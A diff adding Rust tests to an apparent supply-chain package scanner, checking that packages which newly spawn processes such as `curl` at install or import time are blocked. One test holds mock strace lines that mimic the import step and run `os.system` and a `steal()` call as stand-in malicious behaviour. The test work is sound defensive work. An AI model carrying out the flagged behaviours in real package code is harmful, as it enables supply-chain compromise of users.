+        let report = scan_with_imports(
+            [Some(loaded(CURL)), Some(loaded(QUIET)), Some(loaded(QUIET))],
+            PolicyConfig::default(),
+        )
+        .await;
+        assert!(!report.allowed);
+        assert_eq!(
+            report.blocked_reasons,
+            vec!["import_process_exec_anomaly".to_string()]
+        );
+    }
+
+    #[tokio::test]
+    async fn the_same_behaviour_in_every_version_is_not_new_at_import_time() {
+        let report = scan_with_imports(
+            [Some(loaded(CURL)), Some(loaded(CURL)), Some(loaded(CURL))],
+            PolicyConfig::default(),
+        )
+        .await;
+        assert!(report.allowed, "{:?}", report.blocked_reasons);
+    }
+
+    #[tokio::test]
+    async fn an_install_time_allowlist_does_not_allow_the_same_thing_at_import_time() {
+        let policy = PolicyConfig {
+            process_exec_allowlist: HashMap::from([(
+                "pkg".to_string(),
+                HashSet::from(["curl".to_string()]),
+            )]),
+            ..PolicyConfig::default()
+        };
+        let report = scan_with_imports(
+            [Some(loaded(CURL)), Some(loaded(QUIET)), Some(loaded(QUIET))],
+            policy,
+        )
+        .await;
+        assert!(!report.allowed);
+    }
+
+    #[tokio::test]
+    async fn an_import_time_allowlist_allows_it() {
+        let policy = PolicyConfig {
+            import_allowlists: super::ImportAllowlists {
+                process_exec: HashMap::from([(
+                    "pkg".to_string(),
+                    HashSet::from(["curl".to_string()]),
+                )]),
+                ..super::ImportAllowlists::default()
+            },
+            ..PolicyConfig::default()
+        };
+        let report = scan_with_imports(
+            [Some(loaded(CURL)), Some(loaded(QUIET)), Some(loaded(QUIET))],
+            policy,
+        )
+        .await;
+        assert!(report.allowed, "{:?}", report.blocked_reasons);
+    }
+
+    #[tokio::test]
+    async fn an_import_time_allowlist_does_not_allow_it_at_install_time() {
+        let _env = EnvVarGuard::set("GYRSEEK_TEST_FORCE_RELEASES_LAST_24H", "0");
+        // `curl` runs while installing 2.0.0 and the import-time list names it.
+        struct InstallCurl;
+        impl crate::sandbox::SandboxRunner for InstallCurl {
+            fn trace_install(&self, _: &str, _: &str, _: &str) -> Result<String, String> {
+                Ok(QUIET.to_string())
+            }
+            fn trace_install_matrix(
+                &self,
+                _: &str,
+                probes: &[(String, String)],
+            ) -> Result<Vec<crate::sandbox::ProbeTrace>, String> {
+                Ok(probes
+                    .iter()
+                    .map(|p| crate::sandbox::ProbeTrace {
+                        probe: p.clone(),
+                        trace: if p.1 == "2.0.0" { CURL } else { QUIET }.to_string(),
+                        install_failure: None,
+                        import: Some(loaded(QUIET)),
+                    })
+                    .collect())
+            }
+        }
+        let policy = PolicyConfig {
+            baseline_count: 2,
+            baseline_overrides: HashMap::from([(
+                "pkg".to_string(),
+                (Some("1.9.0".to_string()), Some("1.8.0".to_string())),
+            )]),
+            import_allowlists: super::ImportAllowlists {
+                process_exec: HashMap::from([(
+                    "pkg".to_string(),
+                    HashSet::from(["curl".to_string()]),
+                )]),
+                ..super::ImportAllowlists::default()
+            },
+            ..PolicyConfig::default()
+        };
+        let report = scan_packages_versions(
+            &InstallCurl,
+            "pip",
+            &[("pkg".to_string(), "2.0.0".to_string())],
+            &policy,
+        )
+        .await
+        .remove("pkg|2.0.0")
+        .expect("result");
+        assert_eq!(
+            report.blocked_reasons,
+            vec!["process_exec_anomaly".to_string()]
+        );
+    }
+
+    #[tokio::test]
+    async fn a_load_that_times_out_blocks_whichever_version_it_was() {
+        for runs in [
+            [
+                Some(load_timed_out()),
+                Some(loaded(QUIET)),
+                Some(loaded(QUIET)),
+            ],
+            [
+                Some(loaded(QUIET)),
+                Some(load_timed_out()),
+                Some(loaded(QUIET)),
+            ],
+        ] {
+            let report = scan_with_imports(runs, PolicyConfig::default()).await;
+            assert_eq!(report.blocked_reasons, vec!["import_failed".to_string()]);
+        }
+    }
+
+    #[tokio::test]
+    async fn a_candidate_that_fails_to_load_when_a_baseline_loaded_blocks() {
+        let report = scan_with_imports(
+            [
+                Some(load_failed(QUIET)),
+                Some(loaded(QUIET)),
+                Some(loaded(QUIET)),
+            ],
+            PolicyConfig::default(),
+        )
+        .await;
+        assert_eq!(report.blocked_reasons, vec!["import_failed".to_string()]);
+    }
+
+    #[tokio::test]
+    async fn what_a_failing_candidate_did_before_failing_is_still_reported() {
+        let report = scan_with_imports(
+            [
+                Some(load_failed(CURL)),
+                Some(loaded(QUIET)),
+                Some(loaded(QUIET)),
+            ],
+            PolicyConfig::default(),
+        )
+        .await;
+        assert_eq!(
+            report.blocked_reasons,
+            vec![
+                "import_failed".to_string(),
+                "import_process_exec_anomaly".to_string()
+            ]
+        );
+    }
+
+    #[tokio::test]
+    async fn the_same_load_failure_in_every_version_only_warns() {
+        let report = scan_with_imports(
+            [
+                Some(load_failed(QUIET)),
+                Some(load_failed(QUIET)),
+                Some(load_failed(QUIET)),
+            ],
+            PolicyConfig::default(),
+        )
+        .await;
+        assert!(report.allowed, "{:?}", report.blocked_reasons);
+    }
+
+    #[tokio::test]
+    async fn a_failed_load_still_compares_what_ran_before_the_failure() {
+        let report = scan_with_imports(
+            [
+                Some(load_failed(CURL)),
+                Some(load_failed(QUIET)),
+                Some(load_failed(QUIET)),
+            ],
+            PolicyConfig::default(),
+        )
+        .await;
+        assert_eq!(
+            report.blocked_reasons,
+            vec!["import_process_exec_anomaly".to_string()]
+        );
+    }
+
+    #[tokio::test]
+    async fn a_candidate_that_loads_when_no_baseline_did_is_not_compared() {
+        let report = scan_with_imports(
+            [
+                Some(loaded(CURL)),
+                Some(load_failed(QUIET)),
+                Some(load_failed(QUIET)),
+            ],
+            PolicyConfig::default(),
+        )
+        .await;
+        assert!(report.allowed, "{:?}", report.blocked_reasons);
+    }
+
+    #[tokio::test]
+    async fn without_an_import_step_only_the_install_is_compared() {
+        let report = scan_with_imports([None, None, None], PolicyConfig::default()).await;
+        assert!(report.allowed);
+    }
+
+    #[tokio::test]
+    async fn the_new_package_exemption_does_not_hide_a_load_that_times_out() {
+        let _env = EnvVarGuard::set("GYRSEEK_TEST_FORCE_RELEASES_LAST_24H", "0");
+        let runner = ImportingRunner {
+            imports: HashMap::from([
+                ("2.0.0".to_string(), load_timed_out()),
+                ("1.9.0".to_string(), loaded(QUIET)),
+            ]),
+        };
+        // One baseline exists, two are wanted: the package is exempt from the anomaly checks.
+        let policy = PolicyConfig {
+            baseline_count: 2,
+            baseline_overrides: HashMap::from([(
+                "pkg".to_string(),
+                (Some("1.9.0".to_string()), None),
+            )]),
+            new_package_exemptions: HashMap::from([("pkg".to_string(), "2.0.0".to_string())]),
+            ..PolicyConfig::default()
+        };
+        let report = scan_packages_versions(
+            &runner,
+            "pip",
+            &[("pkg".to_string(), "2.0.0".to_string())],
+            &policy,
+        )
+        .await
+        .remove("pkg|2.0.0")
+        .expect("result");
+        assert!(!report.allowed);
+        assert_eq!(report.blocked_reasons, vec!["import_failed".to_string()]);
+    }
+
+    #[tokio::test]
+    async fn the_new_package_exemption_still_skips_the_import_anomaly_checks() {
+        let _env = EnvVarGuard::set("GYRSEEK_TEST_FORCE_RELEASES_LAST_24H", "0");
+        let runner = ImportingRunner {
+            imports: HashMap::from([
+                ("2.0.0".to_string(), loaded(CURL)),
+                ("1.9.0".to_string(), loaded(QUIET)),
+            ]),
+        };
+        let policy = PolicyConfig {
+            baseline_count: 2,
+            baseline_overrides: HashMap::from([(
+                "pkg".to_string(),
+                (Some("1.9.0".to_string()), None),
+            )]),
+            new_package_exemptions: HashMap::from([("pkg".to_string(), "2.0.0".to_string())]),
+            ..PolicyConfig::default()
+        };
+        let report = scan_packages_versions(
+            &runner,
+            "pip",
+            &[("pkg".to_string(), "2.0.0".to_string())],
+            &policy,
+        )
+        .await
+        .remove("pkg|2.0.0")
+        .expect("result");
+        assert!(report.allowed, "{:?}", report.blocked_reasons);
+    }
+
+    #[test]
+    fn the_import_step_is_not_counted_as_the_packages_own_process() {
+        let xx = |s: &str| -> String { s.bytes().map(|b| format!("\\x{b:02x}")).collect() };
+        let py = crate::sandbox::IMPORT_PYTHON;
+        let node = crate::sandbox::IMPORT_NODE;
+        let trace = format!(
+            "execve(\"/usr/bin/env\", [\"env\", \"HOME=/work\", \"PYTHONPATH=/work\", \"python3\", \"-c\", \"{}\", \"pkg\"], 0x7ff) = 0\n\
+             execve(\"/usr/local/bin/python3\", [\"python3\", \"-c\", \"{}\", \"pkg\"], 0x7ff) = 0\n\
+             execve(\"/usr/local/bin/node\", [\"node\", \"-e\", \"{}\", \"pkg\"], 0x7ff) = 0\n",
+            xx(py),
+            xx(py),
+            xx(node)
+        );
+        assert!(extract_process_exec_signatures(&trace).is_empty());
+    }
+
+    #[test]
+    fn a_program_that_only_looks_like_the_import_step_is_still_reported() {
+        let trace = "execve(\"/usr/bin/python3\", [\"python3\", \"-c\", \"import os; os.system(1)\", \"pkg\"], 0x7ff) = 0\n\
+             execve(\"/usr/bin/node\", [\"node\", \"-e\", \"steal()\", \"pkg\"], 0x7ff) = 0\n";
+        assert_eq!(extract_process_exec_signatures(trace).len(), 2);
+    }
+
+    #[test]
+    fn the_import_scripts_fit_in_a_strace_string() {
+        // strace -s 4096 cuts longer strings, so the script would never match itself.
+        assert!(crate::sandbox::IMPORT_PYTHON.len() < 4000);
+        assert!(crate::sandbox::IMPORT_NODE.len() < 4000);
+        assert!(!crate::sandbox::IMPORT_PYTHON.contains('\''));
+        assert!(!crate::sandbox::IMPORT_NODE.contains('\''));
     }
 }
